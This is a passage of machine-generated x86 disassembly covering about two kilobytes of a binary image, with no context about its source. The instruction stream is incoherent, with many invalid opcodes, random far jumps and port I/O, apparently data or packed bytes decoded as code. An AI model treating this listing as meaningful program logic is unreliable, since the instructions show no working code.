  40525d:	sbb    ecx,DWORD PTR [ebx-0x63]
  405260:	jge    0x405244
  405262:	mov    cl,0x5b
  405264:	fcom   DWORD PTR [edx]
  405266:	xor    ah,BYTE PTR [edi]
  405268:	adc    al,0x5
  40526a:	fwait
  40526b:	bound  esp,QWORD PTR [eax-0x2e]
  40526e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40526f:	and    eax,0x2b93f5ef
  405274:	int    0x97
  405276:	and    BYTE PTR [ebx+0x8],bh
  405279:	es in  eax,dx
  40527b:	pop    ebp
  40527c:	sbb    al,0xc6
  40527e:	cmc    
  40527f:	stos   BYTE PTR es:[edi],al
  405280:	dec    esp
  405281:	cld    
  405282:	dec    ecx
  405283:	mov    esp,0xb5f4f13a
  405288:	popf   
  405289:	jmp    0xfa68c036
  40528e:	ror    BYTE PTR [ebx+0x293eafb1],0xb0
  405295:	mov    ah,0x21
  405297:	lods   eax,DWORD PTR gs:[esi]
  405299:	fsub   st(7),st
  40529b:	push   cs
  40529c:	sub    cl,BYTE PTR [ecx-0x2d]
  40529f:	ins    BYTE PTR es:[edi],dx
  4052a0:	add    DWORD PTR ds:0x3a313f03,esp
  4052a6:	dec    ebx
  4052a7:	jbe    0x40526a
  4052a9:	xchg   ebx,eax
  4052aa:	pusha  
  4052ab:	xchg   DWORD PTR [ebp-0x1f742ffb],ebx
  4052b1:	jl     0x4052bf
  4052b3:	sbb    edx,DWORD PTR [ecx+0x11]
  4052b6:	and    DWORD PTR [edi+0x35a62249],esi
  4052bc:	cmp    ebx,DWORD PTR [eax]
  4052be:	jae    0x405265
  4052c0:	and    DWORD PTR [edx],ebp
  4052c2:	test   bl,dh
  4052c4:	call   0x9572:0x15abac4c
  4052cb:	outs   dx,BYTE PTR ds:[esi]
  4052cc:	add    al,0xf4
  4052ce:	loop   0x405269
  4052d0:	mov    ebp,0x6e354126
  4052d5:	xor    DWORD PTR [esi],ebx
  4052d7:	add    al,BYTE PTR [esi-0x16]
  4052da:	cld    
  4052db:	lock enter 0xe58f,0xf6
  4052e0:	push   cs
  4052e1:	jmp    0x4bca9883
  4052e6:	mov    DWORD PTR [ebp+0x7bf522c1],ebx
  4052ec:	aas    
  4052ed:	ret    0xf055
  4052f0:	or     eax,0x7002afb6
  4052f5:	cwde   
  4052f6:	push   eax
  4052f7:	or     cl,al
  4052f9:	sub    DWORD PTR [edx-0x52fb599],edx
  4052ff:	loopne 0x4052f9
  405301:	xchg   ecx,eax
  405302:	repnz out 0x1,al
  405305:	adc    al,0xfe
  405307:	das    
  405308:	fmulp  st(1),st
  40530a:	fmul   st(3),st
  40530c:	pop    ds
  40530d:	push   esi
  40530e:	mov    bl,0xf5
  405310:	out    dx,al
  405311:	sahf   
  405312:	and    dl,BYTE PTR [ecx+0x4957a68f]
  405318:	push   ds
  405319:	(bad)  
  40531a:	jle    0x4052dd
  40531c:	out    dx,al
  40531d:	lock mov ds:0x77e7b9c9,al
  405323:	push   ecx
  405324:	fstp   QWORD PTR [ecx+ebx*8-0x67fb4032]
  40532b:	inc    ebp
  40532c:	jge    0x4052d9
  40532e:	fwait
  40532f:	sbb    dh,0x51
  405332:	add    DWORD PTR [esp+ecx*2-0xc0243a7],ebx
  405339:	mov    esi,0xc90f0a80
  40533e:	xchg   ecx,eax
  40533f:	inc    edx
  405340:	mov    ss,WORD PTR [edx]
  405342:	and    BYTE PTR [ebp-0x49],ah
  405345:	add    al,0x29
  405347:	test   DWORD PTR [eax-0x6b],edi
  40534a:	bound  edi,QWORD PTR [edx]
  40534c:	pop    edx
  40534d:	mov    WORD PTR [ebx],cs
  40534f:	and    al,0xe1
  405351:	adc    BYTE PTR [bp+di],dl
  405354:	fisttp DWORD PTR [eax+0x64]
  405357:	outs   dx,DWORD PTR ds:[esi]
  405358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405359:	sar    DWORD PTR [eax-0x83d7fad],cl
  40535f:	mov    bh,BYTE PTR ds:0x735c6b78
  405365:	xchg   ebx,eax
  405366:	hlt    
  405367:	and    al,cl
  405369:	cmp    eax,0x3c0d6f74
  40536e:	jb     0x4052fa
  405370:	mov    dl,0x52
  405372:	jne    0x405388
  405374:	sahf   
  405375:	les    esi,FWORD PTR [eax+ecx*4]
  405378:	retf   
  405379:	arpl   WORD PTR [edx+0x2dcb4465],bx
  40537f:	mov    BYTE PTR [ecx],dl
  405381:	js     0x3ad2b98d
  405387:	push   ax
  405389:	in     eax,dx
  40538a:	cld    
  40538b:	and    ecx,DWORD PTR [edx]
  40538d:	das    
  40538e:	std    
  40538f:	sbb    DWORD PTR [edi],ecx
  405391:	and    al,0x89
  405393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405394:	outs   dx,BYTE PTR ds:[esi]
  405395:	inc    esp
  405396:	(bad)  
  405397:	mov    ecx,0x47c031e5
  40539c:	bound  edi,QWORD PTR [eax]
  40539e:	rol    BYTE PTR [ebx+0x7a9531ec],cl
  4053a4:	call   0xf305:0x2f50c7d4
  4053ab:	pop    edi
  4053ac:	das    
  4053ad:	xchg   ebp,eax
  4053ae:	ret    
  4053af:	retf   0x4e99
  4053b2:	cwde   
  4053b3:	and    al,BYTE PTR [edi+ecx*4]
  4053b6:	ffree  st(1)
  4053b8:	push   edi
  4053b9:	add    al,0x2b
  4053bb:	sub    ecx,DWORD PTR [edx+0x12]
  4053be:	test   ebx,ebp
  4053c0:	pop    esi
  4053c1:	rol    al,1
  4053c3:	test   BYTE PTR [esi-0x1c45ca44],cl
  4053c9:	inc    esp
  4053ca:	fdivr  DWORD PTR [edx+0x65]
  4053cd:	add    BYTE PTR ss:[ebx],dl
  4053d0:	adc    BYTE PTR [ebx-0x462f17ca],0x10
  4053d7:	stos   BYTE PTR es:[edi],al
  4053d8:	iret   
  4053d9:	es jne 0x40539d
  4053dc:	test   eax,0x6d160a69
  4053e1:	loope  0x4053ce
  4053e3:	in     al,0xba
  4053e5:	sahf   
  4053e6:	xchg   esi,eax
  4053e7:	fisttp WORD PTR [ecx+0xd58e5f5]
  4053ed:	pop    DWORD PTR [ecx]
  4053ef:	inc    edi
  4053f0:	test   ebp,0x6cf55bc1
  4053f6:	cmp    eax,ecx
  4053f8:	xlat   BYTE PTR ds:[ebx]
  4053f9:	out    dx,eax
  4053fa:	int3   
  4053fb:	cmp    BYTE PTR [eax],cl
  4053fd:	test   eax,0xedb4713
  405402:	call   0xd06fd12a
  405407:	sahf   
  405408:	outs   dx,DWORD PTR ds:[esi]
  405409:	and    ecx,DWORD PTR [ecx+0x16]
  40540c:	sbb    cl,BYTE PTR [ebx+esi*2-0x58dde3da]
  405413:	sub    DWORD PTR [esi+0x5ffdaae6],esi
  405419:	mov    ecx,0x781dac06
  40541e:	mov    ds:0x6c89423c,eax
  405423:	loope  0x4053e8
  405425:	(bad)  
  405426:	in     al,0x7d
  405428:	pop    esp
  405429:	in     eax,dx
  40542a:	xor    BYTE PTR [esi+edi*4-0x69],ah
  40542e:	mov    ebx,0x17f418
  405433:	out    0x4c,eax
  405435:	imul   ecx,edx,0xffffff9f
  405438:	xchg   BYTE PTR [esi+0x29e4d983],dl
  40543e:	push   es
  40543f:	mov    ah,0x41
  405441:	dec    eax
  405442:	adc    edx,DWORD PTR [esi+0x24]
  405445:	sbb    BYTE PTR [edx-0x27550e25],cl
  40544b:	sahf   
  40544c:	jg     0x405479
  40544e:	pop    esp
  40544f:	or     ah,bh
  405451:	xor    BYTE PTR [eax],cl
  405453:	mov    ebx,DWORD PTR [ecx+0x50]
  405456:	test   BYTE PTR [ebx+eax*8],0xc1
  40545a:	push   ecx
  40545b:	shl    BYTE PTR [edx-0x20],0x6d
  40545f:	xchg   edi,eax
  405460:	popf   
  405461:	sbb    al,0x33
  405463:	shr    DWORD PTR [ebx+0x3a],1
  405466:	sar    BYTE PTR [edi+ebp*1],1
  405469:	popa   
  40546a:	(bad)  
  40546b:	not    DWORD PTR [edi-0x4c30bf1f]
  405471:	out    0x93,eax
  405473:	mov    ds:0x26e15e65,al
  405478:	fimul  DWORD PTR [esp+edi*2+0x4fb0c734]
  40547f:	sbb    esp,edx
  405481:	jns    0x40540e
  405483:	pop    ebp
  405484:	xchg   ebx,eax
  405485:	mov    BYTE PTR ds:0x59618d0e,ch
  40548b:	in     eax,dx
  40548c:	inc    esi
  40548d:	int3   
  40548e:	adc    BYTE PTR ds:0x3d402f22,al
  405494:	adc    DWORD PTR [edx-0x77],ebx
  405497:	dec    edx
  405498:	(bad)  
  405499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40549a:	ins    DWORD PTR es:[edi],dx
  40549b:	(bad)  
  40549c:	fisttp WORD PTR [ecx+0x64a1190f]
  4054a2:	or     BYTE PTR [edx+0x2f539c00],0x7b
  4054a9:	jno    0x405526
  4054ab:	mov    dl,0x55
  4054ad:	xchg   BYTE PTR [ecx],dl
  4054af:	outs   dx,DWORD PTR ds:[esi]
  4054b0:	das    
  4054b1:	mov    dl,0x42
  4054b3:	sub    BYTE PTR [edx+0x5d],0x53
  4054b7:	test   BYTE PTR [edi],ch
  4054b9:	push   ebx
  4054ba:	loope  0x405525
  4054bc:	ret    0x85da
  4054bf:	repz sahf 
  4054c1:	xchg   edx,eax
  4054c2:	dec    edi
  4054c3:	dec    edi
  4054c4:	push   edx
  4054c5:	test   al,0x7b
  4054c7:	dec    esi
  4054c8:	call   0xc9f6:0xf69b9e2d
  4054cf:	pop    ecx
  4054d0:	fdiv   st(7),st
  4054d2:	adc    BYTE PTR [edx],ah
  4054d4:	aaa    
  4054d5:	leave  
  4054d6:	test   ah,ah
  4054d8:	inc    eax
  4054d9:	pop    ss
  4054da:	xor    al,0x70
  4054dc:	ins    BYTE PTR es:[edi],dx
  4054dd:	pop    esi
  4054de:	(bad)  
  4054df:	cmp    BYTE PTR [edi-0x3c8bafb9],dh
  4054e5:	test   BYTE PTR [edi],bh
  4054e7:	push   ebp
  4054e8:	jge    0x4054b1
  4054ea:	fdiv   QWORD PTR [esi-0x68]
  4054ed:	cmp    al,0x4e
  4054ef:	pop    ds
  4054f0:	(bad)  
  4054f1:	sub    eax,0xe36c2b10
  4054f6:	or     esp,ebp
  4054f8:	mov    esi,0x3b0a3e7a
  4054fd:	dec    BYTE PTR es:0x6172c044
  405504:	popa   
  405505:	aaa    
  405506:	fist   WORD PTR [ecx-0x7469ee82]
  40550c:	jb     0x405557
  40550e:	sbb    esp,edi
  405510:	jmp    0x4054ab
  405512:	dec    esp
  405513:	pusha  
  405514:	fs dec esi
  405516:	(bad)  
  405517:	jmp    0x9d3f:0x1fe9b393
  40551e:	xchg   esi,eax
  40551f:	loope  0x40559c
  405521:	mov    edi,0xec468398
  405526:	inc    ebx
  405527:	dec    eax
  405528:	fisttp DWORD PTR ds:[eax]
  40552b:	test   DWORD PTR [ecx+0x59],0x4df153d4
  405532:	dec    ebp
  405533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405534:	xchg   esp,eax
  405535:	sub    dh,cl
  405537:	loope  0x4054d6
  405539:	add    eax,0xc065d76f
  40553e:	mov    ?,WORD PTR [esi+0x26]
  405541:	inc    esp
  405542:	std    
  405543:	cmp    eax,0xbc64b83c
  405548:	push   0x990b6f66
  40554d:	sahf   
  40554e:	mov    cs,WORD PTR [esi-0x5be29e08]
  405554:	out    dx,al
  405555:	test   al,0xf2
  405557:	xchg   BYTE PTR [ebx-0x4048a110],ah
  40555d:	jp     0x4055db
  40555f:	test   esp,edi
  405561:	cmp    BYTE PTR [edi+0x7bedda26],bh
  405567:	in     al,0x2b
  405569:	sub    dh,BYTE PTR [ebx+0x13]
  40556c:	cli    
  40556d:	cs arpl bp,bx
  405570:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405571:	sbb    esp,DWORD PTR [eax+edx*2+0x37039acd]
  405578:	sbb    al,0x3
  40557a:	ror    DWORD PTR [eax-0xa78ca43],0xf7
  405581:	push   cs
  405582:	call   0x9c85:0x8ca85efe
  405589:	add    esp,DWORD PTR [ecx-0x1e79dedf]
  40558f:	shl    dl,cl
  405591:	(bad)  
  405592:	xlat   BYTE PTR ds:[ebx]
  405593:	mov    fs,ebp
  405595:	fld    TBYTE PTR [edi+0x614f6451]
  40559b:	ds hlt 
  40559d:	xchg   edi,eax
  40559e:	loopne 0x405581
  4055a0:	jbe    0x4055ed
  4055a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055a3:	lahf   
  4055a4:	sub    eax,0x889381a
  4055a9:	mov    ecx,0x9ff2435a
  4055ae:	push   ecx
  4055af:	into   
  4055b0:	mov    DWORD PTR [eax],ebx
  4055b2:	adc    al,BYTE PTR [ebx+0x1e]
  4055b5:	out    0x28,al
  4055b7:	xor    ch,BYTE PTR [ecx]
  4055b9:	xchg   ebp,eax
  4055ba:	mov    bl,bh
  4055bc:	out    dx,al
  4055bd:	test   ah,0x95
  4055c0:	ror    DWORD PTR [eax-0x54],cl
  4055c3:	mov    edi,esp
  4055c5:	ror    BYTE PTR [ebx],1
  4055c7:	add    BYTE PTR [edi],dl
  4055c9:	sar    BYTE PTR [ebp+0x3d],cl
  4055cc:	js     0x40561c
  4055ce:	ins    DWORD PTR es:[edi],dx
  4055cf:	inc    eax
  4055d0:	push   ebp
  4055d1:	aam    0x2f
  4055d3:	cmp    eax,0x82f68753
  4055d8:	push   0xffffffeb
  4055da:	ret    
  4055db:	icebp  
  4055dc:	push   ebp
  4055dd:	pop    ebp
  4055de:	loopne 0x4055e4
  4055e0:	aas    
  4055e1:	adc    al,0xea
  4055e3:	rcr    DWORD PTR [edx+0xc],1
  4055e6:	pop    ss
  4055e7:	fstp   DWORD PTR [eax-0x56]
  4055ea:	call   0xf68d:0x4ac2424
  4055f1:	out    0xed,al
  4055f3:	addr16 sti 
  4055f5:	outs   dx,BYTE PTR ds:[esi]
  4055f6:	or     eax,0x31fa0a97
  4055fb:	dec    esi
  4055fc:	dec    eax
  4055fd:	test   esp,ecx
  4055ff:	in     al,0xda
  405601:	add    esp,DWORD PTR [esi]
  405603:	stos   DWORD PTR es:[edi],eax
  405604:	cmp    DWORD PTR ds:0x9747bd64,ecx
  40560a:	into   
  40560b:	add    BYTE PTR [eax+0x69f77d1c],0x9b
  405612:	imul   ebp,DWORD PTR [ebx-0x14767fa0],0x68ca308e
  40561c:	or     DWORD PTR [edi],ebx
  40561e:	aas    
  40561f:	jae    0x405673
  405621:	test   BYTE PTR [ebp+0x6ecedf6],dl
  405627:	jp     0x40561e
  405629:	or     al,0xd9
  40562b:	fwait
  40562c:	jecxz  0x405623
  40562e:	adc    esp,DWORD PTR [eax+edi*8+0x70255800]
  405635:	(bad)  
  405636:	xor    BYTE PTR [ebx+0x26],bh
  405639:	xor    DWORD PTR [ecx-0x6d575e32],0xfffffff6
  405640:	cmp    eax,0x72cd0282
  405645:	mov    ebx,DWORD PTR [edi+0x5e]
  405648:	push   esp
  405649:	fs adc al,0xfc
  40564c:	hlt    
  40564d:	das    
  40564e:	addr16 inc edi
  405650:	mov    esp,0xb7828d8b
  405655:	rol    al,1
  405657:	xor    al,0xc6
  405659:	and    esp,DWORD PTR [ebx-0x65685f53]
  40565f:	data16 aas 
  405661:	xor    al,0x4a
  405663:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405664:	or     BYTE PTR [ebp+edi*2-0x45],cl
  405668:	push   esp
  405669:	cli    
  40566a:	xor    eax,0x67b777ee
  40566f:	xchg   esp,eax
  405670:	sub    al,0x5c
  405672:	add    BYTE PTR [eax],0x48
  405675:	fsub   st(2),st
  405677:	sbb    edi,DWORD PTR [ecx-0x434e10ec]
  40567d:	fist   WORD PTR [edi-0x3c705fea]
  405683:	mov    edi,0x945d2cb0
  405688:	sub    DWORD PTR [eax+0x10575eba],edx
  40568e:	retf   0x5661
  405691:	mul    BYTE PTR [ecx-0x554b6fa8]
  405697:	jmp    0xb0d0:0x9cb209b6
  40569e:	cmp    al,0x0
  4056a0:	jle    0x405623
  4056a2:	cli    
  4056a3:	add    ebp,eax
  4056a5:	and    edx,eax
  4056a7:	out    dx,al
  4056a8:	and    eax,0x41ea348f
  4056ad:	popa   
  4056ae:	sahf   
  4056af:	jge    0x4056ee
  4056b1:	aaa    
  4056b2:	cmp    al,0xe8
  4056b4:	cmp    bl,BYTE PTR [ebp+esi*8-0x5e]
  4056b8:	out    dx,eax
  4056b9:	enter  0xc98,0xc3
  4056bd:	cmp    DWORD PTR [eax],0xfffffff5
  4056c0:	fist   DWORD PTR [eax+0x41]
  4056c3:	mov    bl,0xcc
  4056c5:	xchg   BYTE PTR [edi-0x10],bh
  4056c8:	and    BYTE PTR [ebp+0x7bfb6604],al
  4056ce:	and    al,al
  4056d0:	adc    al,0xda
  4056d2:	popf   
  4056d3:	icebp  
  4056d4:	xor    eax,0x6c08141e
  4056d9:	ss call 0x8627:0x5ca8643c
  4056e1:	mov    ah,0xfe
  4056e3:	inc    ebx
  4056e4:	nop
  4056e5:	sbb    ecx,0xffffffbf
  4056e8:	scas   eax,DWORD PTR es:[edi]
  4056e9:	push   ecx
  4056ea:	nop
  4056eb:	jae    0x405760
  4056ed:	push   eax
  4056ee:	inc    edx
  4056ef:	inc    edi
  4056f0:	inc    ebp
  4056f1:	add    al,0xcc
  4056f3:	mov    ebx,0x41e42601
  4056f8:	outs   dx,BYTE PTR ds:[esi]
  4056f9:	push   ecx
  4056fa:	bound  esp,QWORD PTR [eax+0x1]
  4056fd:	jo     0x40570f
  4056ff:	loopne 0x405711
  405701:	add    edi,ebp
  405703:	inc    ebx
  405704:	add    al,bl
  405706:	sub    ah,BYTE PTR [edx-0x38]
  405709:	pop    ebx
  40570a:	pop    es
  40570b:	push   0xf
  40570d:	mov    ebp,0xf4e5917e
  405712:	test   al,0x38
  405714:	sub    eax,0x9634446
  405719:	mov    eax,0xbe6dd40f
  40571e:	pushf  
  40571f:	cmp    dl,bh
  405721:	xchg   ebx,eax
  405722:	leave  
  405723:	xor    dh,BYTE PTR [eax+0x30]
  405726:	mov    ch,0xe
  405728:	je     0x4056ba
  40572a:	je     0x405721
  40572c:	into   
  40572d:	inc    ebp
  40572e:	mov    bl,0xaf
  405730:	inc    eax
  405731:	stos   BYTE PTR es:[edi],al
  405732:	xchg   ebp,eax
  405733:	neg    BYTE PTR [ebx-0x58657396]
  405739:	xchg   ebp,eax
  40573a:	stos   BYTE PTR es:[edi],al
  40573b:	lds    ebx,FWORD PTR [eax-0x3e36e69d]
  405741:	in     eax,0x8
  405743:	or     BYTE PTR [edi],al
  405745:	pop    edi
  405746:	scas   eax,DWORD PTR es:[edi]
  405747:	ja     0x8202fe07
  40574d:	rcl    DWORD PTR [esi+0x6c1f41a3],cl
  405753:	adc    esp,DWORD PTR [ebx+0x7f]
  405756:	inc    edx
  405757:	outs   dx,BYTE PTR ds:[esi]
  405758:	sbb    ah,BYTE PTR [ebp+0x2e]
  40575b:	bound  eax,QWORD PTR [ebx-0x2da4236d]
  405761:	jbe    0x405789
  405763:	hlt    
  405764:	or     ebp,edi
  405766:	adc    DWORD PTR [edx+0x1336490c],eax
  40576c:	xor    dl,bh
  40576e:	mov    cl,0x72
  405770:	mov    cl,0x7f
  405772:	dec    edi
  405773:	inc    esi
  405774:	(bad)  
  405776:	ss xchg ecx,eax
  405778:	(bad)  
  405779:	out    dx,al
  40577a:	(bad)  
  40577b:	daa    
  40577c:	cmp    esi,DWORD PTR [esi-0x2e]
  40577f:	jno    0x4057ba
  405781:	mov    al,ds:0xe8d0a0be
  405786:	stos   DWORD PTR es:[edi],eax
  405787:	mov    al,ds:0x4bd4c98f
  40578c:	mov    eax,ds:0x3aeb1bc
  405791:	dec    ecx
  405792:	jnp    0x405764
  405794:	push   DWORD PTR [ebp+0x121fb7d3]
  40579a:	(bad)  
  40579c:	and    eax,0x32bf6e29
  4057a1:	out    dx,al
  4057a2:	aaa    
  4057a3:	pop    eax
  4057a4:	dec    BYTE PTR [ebp-0x7b]
  4057a7:	repz pop edi
  4057a9:	(bad)  
  4057aa:	out    0xbb,eax
  4057ac:	adc    esi,ebx
  4057ae:	sbb    BYTE PTR [esi],dl
  4057b0:	dec    ecx
  4057b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057b2:	push   ecx
  4057b3:	in     eax,0x2d
  4057b5:	lock pushf 
  4057b7:	pop    ebx
  4057b8:	aaa    
  4057b9:	jle    0x4057e6
  4057bb:	pop    ecx
  4057bc:	adc    ch,BYTE PTR [eax+eax*1]
  4057bf:	repz mov fs,edx
  4057c2:	pop    ebx
  4057c3:	jmp    0x4057c0
  4057c5:	mov    esi,0xe3faeac7
  4057ca:	adc    BYTE PTR ds:0x98b7c9f8,ch
  4057d0:	jg     0x4057a0
  4057d2:	push   edi
  4057d3:	jp     0x4057ce
  4057d5:	call   0x836d:0x38511114
  4057dc:	mov    BYTE PTR [edi-0x45],bl
  4057df:	sub    ch,BYTE PTR [edx]
  4057e1:	retf   0x3eeb
  4057e4:	idiv   edi
  4057e6:	lods   eax,DWORD PTR ds:[esi]
  4057e7:	cmc    
  4057e8:	fucomp st(2)
  4057ea:	push   ebx
  4057eb:	aaa    
  4057ec:	popa   
  4057ed:	push   0x36045d6e
  4057f2:	pop    ebx
  4057f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057f4:	fisub  WORD PTR [ebp+0x741a08b4]
  4057fa:	call   0xf6aa6f2f
  4057ff:	adc    eax,0xd0fa134a
  405804:	mov    ch,0x52
  405806:	cwde   
  405807:	fdivr  st(0),st
  405809:	mov    bh,0x41
  40580b:	fs into 
  40580d:	(bad)
  405810:	shl    BYTE PTR [esp+edi*1+0x689ab2ee],1
  405817:	out    dx,al
  405818:	mov    es,WORD PTR [ecx]
  40581a:	or     ebx,ebx
  40581c:	xor    al,0x43
  40581e:	jae    0x4057ce
  405820:	jecxz  0x405857
  405822:	jne    0x40587e
  405824:	and    ah,BYTE PTR [edi+0x76]
  405827:	aaa    
  405828:	dec    eax
  405829:	dec    edx
  40582a:	retf   0xc329
  40582d:	jge    0x405822
  40582f:	mov    al,ds:0xf2356816
  405834:	loope  0x40586d
  405836:	pop    ecx
  405837:	push   eax
  405838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405839:	fbld   TBYTE PTR [ebp+0x11]
  40583c:	lods   eax,DWORD PTR ds:[esi]
  40583d:	fsub   st(6),st
  40583f:	ja     0x40586b
  405841:	shl    BYTE PTR [ebx+0x53],1
  405844:	mov    ebp,0x40061fc7
  405849:	enter  0x3107,0xa3
  40584d:	test   DWORD PTR [esi+0x6005f6bf],ecx
  405853:	dec    ebx
  405854:	push   esi
  405855:	fxch   st(2)
  405857:	imul   ecx,DWORD PTR [edx],0xfffffff9
  40585a:	lods   al,BYTE PTR ds:[esi]
  40585b:	mov    ah,0x42
  40585d:	mov    eax,ebx
  40585f:	aaa    
  405860:	inc    esi
  405861:	test   BYTE PTR [edx+eax*2],0x34
  405865:	pop    ebp
  405866:	cdq    
  405867:	sub    DWORD PTR [eax+0x3c039a4d],eax
  40586d:	xchg   esp,eax
  40586e:	fnstsw WORD PTR [esi-0x5fa03382]
  405874:	xchg   ebp,eax
  405875:	enter  0x8158,0x55
  405879:	xchg   esi,eax
  40587a:	mov    edi,0x9ba4eb50
  40587f:	and    al,0xf0
  405881:	shl    esp,1
  405883:	adc    eax,0x93de4810
  405888:	into   
  405889:	add    esi,DWORD PTR [edx]
  40588b:	fst    QWORD PTR ds:0x5717b3c0
  405891:	sbb    BYTE PTR [ebx+0x1d80c763],bl
  405897:	(bad)  
  405899:	xor    DWORD PTR [edi],0x62912fdd
  40589f:	out    dx,al
  4058a0:	cmp    eax,0xa56a7489
  4058a5:	mov    ch,dl
  4058a7:	jmp    0x405872
  4058a9:	sbb    al,0xa
  4058ab:	sti    
  4058ac:	inc    ecx
  4058ad:	xor    al,0xf9
  4058af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058b0:	test   DWORD PTR [edi],ebp
  4058b2:	stos   BYTE PTR es:[edi],al
  4058b3:	sbb    eax,0xd71e0eb0
  4058b8:	int    0x64
  4058ba:	shr    BYTE PTR [esi+ecx*4+0x57],0xea
  4058bf:	sub    al,0x57
  4058c1:	mov    ecx,0xea4c028e
  4058c6:	jns    0x40586a
  4058c8:	test   bl,dl
  4058ca:	mov    BYTE PTR [ecx+ebx*8+0x47058a83],dl
  4058d1:	adc    esp,DWORD PTR [edx-0x49]
  4058d4:	mov    esp,DWORD PTR [edx-0x4d400894]
  4058da:	fsubr  QWORD PTR [esi-0x38e3ac85]
  4058e0:	popa   
  4058e1:	int3   
  4058e2:	pop    es
  4058e3:	mov    edi,0xa0841f3e
  4058e8:	and    al,0x69
  4058ea:	fmul   QWORD PTR [ecx-0x151df66e]
  4058f0:	jnp    0x405946
  4058f2:	xchg   esp,eax
  4058f3:	jle    0x40590b
  4058f5:	movlps xmm5,QWORD PTR [edx+0x235e7f6a]
  4058fc:	repnz or ah,BYTE PTR [edx]
  4058ff:	scas   eax,DWORD PTR es:[edi]
  405900:	push   ss
  405901:	ror    DWORD PTR [ebx+eiz*4],0x27
  405905:	jmp    DWORD PTR [ebx+edx*4-0x7520181e]
  40590c:	gs push esi
  40590e:	mov    ch,ch
  405910:	psrlq  mm1,mm6
  405913:	imul   BYTE PTR [edi]
  405915:	add    DWORD PTR [esi+0x6893ddbd],eax
  40591b:	dec    esi
  40591c:	imul   esi,edi,0x4e
  40591f:	repnz ss nop
  405922:	add    bl,BYTE PTR [esp+edx*2]
  405925:	adc    eax,0xb191b302
  40592a:	add    bl,dh
  40592c:	pop    eax
  40592d:	push   eax
  40592e:	mov    DWORD PTR ds:0xd6a99a25,0x970302a7
  405938:	sbb    BYTE PTR [ecx],0x75
  40593b:	push   es
  40593c:	fdiv   st,st(6)
  40593e:	adc    eax,ebx
  405940:	ins    BYTE PTR es:[edi],dx
  405941:	mov    al,ds:0xfae68be8
  405946:	retw   
  405948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405949:	(bad)  
  40594a:	jo     0x4059a1
  40594c:	popf   
  40594d:	outs   dx,BYTE PTR ds:[esi]
  40594e:	mov    eax,0x94c57ce4
  405953:	add    al,0xb8
  405955:	mov    edx,0x65ac22ff
  40595a:	shl    BYTE PTR [ecx-0x5fbad5c7],0x1a
  405961:	mov    bh,0xfe
  405963:	out    dx,al
  405964:	hlt    
  405965:	cmp    esp,DWORD PTR [edx-0x78958ca7]
  40596b:	inc    edx
  40596c:	or     ah,bh
  40596e:	shl    BYTE PTR [esi+eax*8+0x24832aa8],0xd6
  405976:	lahf   
  405977:	or     al,BYTE PTR [ecx+0x5d421a1f]
  40597d:	in     eax,dx
  40597e:	and    al,al
  405980:	and    esp,esp
  405982:	nop
  405983:	cmp    DWORD PTR [edx+0x9],ebx
  405986:	imul   DWORD PTR [edx-0x5d]
  405989:	pop    ds
  40598a:	add    eax,0x6ed79e33
  40598f:	aas    
  405990:	push   ds
  405991:	data16 sub bh,bh
  405994:	retf   0x729a
  405997:	pop    ebp
  405998:	(bad)
  40599b:	pop    ebx
  40599c:	mov    eax,0x133b3d24
  4059a1:	adc    DWORD PTR [esi+0x206c894f],esi
  4059a7:	(bad)  
  4059a8:	or     ebp,esp
  4059aa:	ss jg  0x4059c8
  4059ad:	cs xchg edx,eax
  4059af:	mov    ds:0x75da0dee,al
  4059b4:	int    0x18
  4059b6:	jle    0x405979
  4059b8:	pop    edx
  4059b9:	mov    ch,0x8f
  4059bb:	inc    ebp
  4059bc:	jmp    0xc4f4df69
  4059c1:	shr    BYTE PTR [eax+0x10],1
  4059c4:	aaa    
  4059c5:	xchg   edx,eax
  4059c6:	aaa    
  4059c7:	push   es
  4059c8:	sub    eax,0xf2646a85
  4059cd:	aad    0xa9
  4059cf:	cld    
  4059d0:	inc    ebx
  4059d1:	(bad)  
  4059d2:	aad    0x10
  4059d4:	xor    al,BYTE PTR [esi+esi*2-0x69]
  4059d8:	dec    edi
  4059d9:	mov    ch,0x81
  4059db:	into   
  4059dc:	push   esp
  4059dd:	cld    
  4059de:	or     BYTE PTR [ecx],dl
  4059e0:	imul   eax,DWORD PTR [ebx+0x50],0x1cb98810
  4059e7:	and    bl,0xbb
  4059ea:	bound  edi,QWORD PTR [esi-0x2b]
  4059ed:	pop    edx
  4059ee:	mov    bh,0x3d
  4059f0:	mov    edx,0x3491f871
  4059f5:	icebp  
  4059f6:	push   ss
  4059f7:	xchg   ecx,eax
  4059f8:	mov    esp,0xf1fad980
  4059fd:	dec    ebp
  4059fe:	cmp    bh,al
  405a00:	sub    cl,cl
  405a02:	js     0x4059bc
  405a04:	arpl   WORD PTR [ecx+0x391c35f4],sp
  405a0a:	jecxz  0x40598c
  405a0c:	scas   eax,DWORD PTR es:[edi]
  405a0d:	lock out 0x47,eax
  405a10:	sub    eax,0x21a6bf44
  405a15:	cmp    BYTE PTR [eax+0x49cc7a94],0x4d
  405a1c:	cmc    
  405a1d:	into   
  405a1e:	cmp    BYTE PTR [esi+0x5],ah
  405a21:	mov    eax,ds:0x7b7f8f60
  405a26:	jge    0x4059fd
  405a28:	mov    ah,0x16
  405a2a:	push   esi
  405a2b:	dec    edi
  405a2c:	je     0x405aa2
  405a2e:	sar    bl,0x45
  405a31:	fnsave [esi+0x54]
  405a34:	dec    ecx
  405a35:	xor    esi,DWORD PTR [edx+0x23bd7da2]
  405a3b:	push   edi
  405a3c:	or     al,0x75
  405a3e:	ins    DWORD PTR es:[edi],dx
  405a3f:	das    
  405a40:	push   cs
  405a41:	adc    BYTE PTR [edx-0x6763fd09],bl
  405a47:	ins    DWORD PTR es:[edi],dx
